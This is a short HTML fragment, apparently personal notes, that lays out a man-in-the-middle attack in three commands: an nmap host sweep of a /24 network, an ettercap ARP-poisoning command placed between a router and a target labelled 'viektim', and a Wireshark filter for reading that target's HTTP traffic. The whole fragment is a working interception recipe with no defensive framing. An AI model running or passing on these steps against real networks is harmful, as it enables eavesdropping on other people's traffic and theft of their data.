            <p>Get MAC address</p>
            <out>
                sudo nmap -sn [IP]/24 
            </out>
            <p>Connect</p>
            <out>
                sudo ettercap -T -S -i wlan0 -M arp:remote /[Router-IP]//[viektim-IP]
            </out>
            <p>Read Data</p>
            <p>filter: ip.addr == [IP] && http</p>
            <out>
                sudo wireshark
